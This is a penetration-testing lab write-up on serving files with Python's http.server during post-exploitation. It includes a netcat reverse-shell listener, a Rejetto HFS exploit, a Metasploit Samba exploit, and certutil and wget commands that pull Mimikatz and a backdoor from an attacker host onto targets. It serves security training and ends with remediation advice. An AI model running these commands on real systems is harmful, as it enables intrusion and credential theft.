---
title: "Setting up a Web Server with Python"
description: "Using Python's built-in web servers (SimpleHTTPServer / http.server) to host and transfer tools to compromised hosts — delivering a payload and Mimikatz to a Windows target, and a backdoor to a Linux target with wget."
date: 2025-12-10
platform: "INE Labs"
difficulty: "Easy"
tags: ["Post-Exploitation", "File Transfer", "Python", "http.server", "Mimikatz", "wget", "certutil"]
cover: "./photo3.png"
---

# Setting up a Web Server with Python

**Classification:** Host & Network Penetration Testing / Post-Exploitation<br>
**Attacker:** Kali

## 1. Executive Summary

A quick HTTP server is the simplest way to move tools onto a target. We stand up Python's
built-in web servers (`SimpleHTTPServer` on Python 2, `http.server` on Python 3), then use
them to transfer a payload and **Mimikatz** to a Windows host (exploited via Rejetto) and a
backdoor to a Linux host (exploited via Samba, pulled with `wget`).

## 2. Python Web Servers

We want to serve a Mimikatz executable, so we copy it to a serving directory.

![Mimikatz to transfer](./photo1.png)

![Copying the file](./photo2.png)

Python 2:

```bash
python -m SimpleHTTPServer 80
```

![SimpleHTTPServer (1)](./photo3.png)

![Serving (2)](./photo4.png)

![GET requests logged](./photo5.png)

Python 3:

```bash
python3 -m http.server 80
```

![http.server (1)](./photo6.png)

![Serving (2)](./photo7.png)

![Same behaviour (3)](./photo8.png)

## 3. Transferring to a Windows Target

```bash
db_nmap -sV <win-target>      # Rejetto HFS on 80
```

![Nmap scan (Windows)](./photo9.png)

Using a Rejetto exploit script (needs a hosted `nc.exe` and a listener).

![Downloading the exploit](./photo10.png)

![Reading usage / configuring (1)](./photo11.png)

![Configuring (2)](./photo12.png)

```bash
nc -nvlp 1234
python3 -m http.server 80
```

![Netcat listener](./photo13.png)

![HTTP server](./photo14.png)

![Executing the script — GET received (1)](./photo15.png)

![GET received (2)](./photo16.png)

![Reverse shell obtained](./photo17.png)

Now serving Mimikatz and pulling it onto the target.

```cmd
mkdir C:\Temp
certutil -urlcache -f http://<attacker>/mimikatz.exe C:\Temp\mimikatz.exe
```

![Serving the Mimikatz directory](./photo18.png)

![Creating C:\Temp](./photo19.png)

![Downloading Mimikatz (1)](./photo20.png)

![Mimikatz on the target (2)](./photo21.png)

## 4. Transferring to a Linux Target

```bash
db_nmap -sV <linux-target>    # Samba
use exploit/linux/samba/is_known_pipename
run
```

![Nmap scan (Linux)](./photo22.png)

![is_known_pipename — shell (tmux)](./photo23.png)

```bash
python3 -m http.server 80     # in another tmux pane
# on the target:
wget http://<attacker>/backdoor
```

![HTTP server in another terminal](./photo24.png)

![wget on the target (1)](./photo25.png)

![File transferred (2)](./photo26.png)

## 5. Notes & Remediation

1. **Egress filtering and allow-listing** block the pull of tools (`certutil`, `wget`) and
   their execution.
2. **EDR/AV** should flag Mimikatz and living-off-the-land downloaders.
3. Monitor for unexpected outbound HTTP from servers and new files in temp directories.
